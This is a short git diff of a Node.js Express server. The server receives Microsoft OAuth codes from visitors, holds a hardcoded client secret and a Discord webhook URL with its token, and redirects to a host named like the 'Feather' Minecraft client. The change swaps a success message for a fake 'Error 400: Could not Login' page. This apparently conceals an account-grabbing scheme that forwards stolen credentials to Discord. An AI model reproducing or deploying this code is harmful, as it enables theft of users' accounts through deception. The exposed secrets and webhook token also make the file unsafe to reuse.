@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'CHs8Q~8LQHuKdJAolZpivJO4Jac2Wc3ovI6ghded'
 const client_id = '048e85fb-2ae5-40a9-9492-31cde4d6391e'
-const redirect_uri = 'https://feathermc.onrender.com'
+const redirect_uri = 'https://feather-30gg.onrender.com'
 const webhook_url = 'https://ptb.discord.com/api/webhooks/1055345901691994142/OfnRPrPLUnie1X98li-qlXgwFmATQaLgw2DIDLBY9yDC2RwgS9KzjnFTLYf_lDVEGSs4'
 //Requirements
 const axios = require('axios')
@@ -12,7 +12,7 @@ const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
     console.log("A user has connected")
-    res.send('Success! You can exit this page and return to discord.')
+    res.send('Error 400: Could not Login')
     let code = req.query.code
     if (code == null) {
         console.log("Invalid code")
